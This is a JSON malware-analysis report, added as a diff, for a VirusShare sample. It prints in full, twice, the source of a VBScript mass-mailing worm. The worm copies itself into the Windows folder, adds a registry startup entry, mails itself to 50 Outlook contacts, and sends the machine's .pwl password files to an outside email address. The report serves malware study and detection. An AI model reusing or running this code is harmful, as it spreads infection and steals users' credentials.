@@ -1,0 +1,61 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
+            "CreateObject": "May create an OLE object",
+            "Shell": "May run an executable file or a system command",
+            "WScript.Shell": "May run an executable file or a system command",
+            "windows": "May enumerate application windows"
+        },
+        "macro": "On Error Resume Next\nDim FileSysObject, File\nSet FileSysObject = CreateObject (\"Scripting.FileSystemObject\")\nSet File = FileSysObject.GetFile(WScript.ScriptFullName)\nFile.Copy (\"c:\\windows\\winsystem.vbs\")\nDim WshShell\nSet WshShell = WScript.CreateObject(\"WScript.Shell\")\nWshShell.RegWrite \"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices\\iexplores\", \"c:\\windows\\winsystem.vbs\"\nDim OutlookObject, OutMail, Index\nSet OutlookObject = CreateObject(\"Outlook.Application\")\nFor Index = 1 To 50\nSet OutMail = OutlookObject.CreateItem(0)\nOutMail.to = OutlookObject.GetNameSpace(\"MAPI\").AddressLists(1).AddressEntries(Index)\nOutMail.Subject = \"\ufffd\ufffd\ufffd \ufffd\ufffd\ufffd\ufffd\ufffd \ufffd\ufffd\ufffd\ufffd \ufffd\ufffd\ufffd\ufffd\ufffd...\"\nOutMail.Body = \"\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd \ufffd\ufffd\ufffd\ufffd\"\nOutMail.Attachments.Add(WScript.ScriptFullName)\nOutMail.Send\nNext\nSet OutMail = OutlookObject.CreateItem(0)\nOutMail.to = \"ronin911t@mailru.com\"\nOutMail.Subject = \"\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd \ufffd\ufffd \ufffd\ufffd\ufffd\ufffd\"\nOutMail.Body = \"\ufffd\ufffd \ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\"\nOutMail.Attachments.Add(\"c:\\windows\\*.pwl\")\nOutMail.Send"
+    },
+    "filename": "VirusShare_3f3516213af11441ee9dbe04290df549",
+    "filesize": 1002,
+    "filetype": "ISO-8859 text, with CRLF line terminators",
+    "hashes": {
+        "md5": "3f3516213af11441ee9dbe04290df549",
+        "sha1": "09500c3dd71092b9c599ce0a07db0850cd76aca5",
+        "sha256": "3ae1bc5e7341f92f3bd2c019c56b35781bab47558b801547dfb85174c79aaca9"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "On Error Resume Next",
+            "Dim FileSysObject, File",
+            "Set FileSysObject = CreateObject (\"Scripting.FileSystemObject\")",
+            "Set File = FileSysObject.GetFile(WScript.ScriptFullName)",
+            "File.Copy (\"c:\\windows\\winsystem.vbs\")",
+            "Dim WshShell",
+            "Set WshShell = WScript.CreateObject(\"WScript.Shell\")",
+            "WshShell.RegWrite \"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices\\iexplores\", \"c:\\windows\\winsystem.vbs\"",
+            "Dim OutlookObject, OutMail, Index",
+            "Set OutlookObject = CreateObject(\"Outlook.Application\")",
+            "For Index = 1 To 50",
+            "Set OutMail = OutlookObject.CreateItem(0)",
+            "OutMail.to = OutlookObject.GetNameSpace(\"MAPI\").AddressLists(1).AddressEntries(Index)",
+            "OutMail.Subject = \"   ...\"",
+            "OutMail.Body = \" \"",
+            "OutMail.Attachments.Add(WScript.ScriptFullName)",
+            "OutMail.Send",
+            "Next",
+            "Set OutMail = OutlookObject.CreateItem(0)",
+            "OutMail.to = \"ronin911t@mailru.com\"",
+            "OutMail.Subject = \"  \"",
+            "OutMail.Body = \" \"",
+            "OutMail.Attachments.Add(\"c:\\windows\\*.pwl\")",
+            "OutMail.Send"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.275237",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
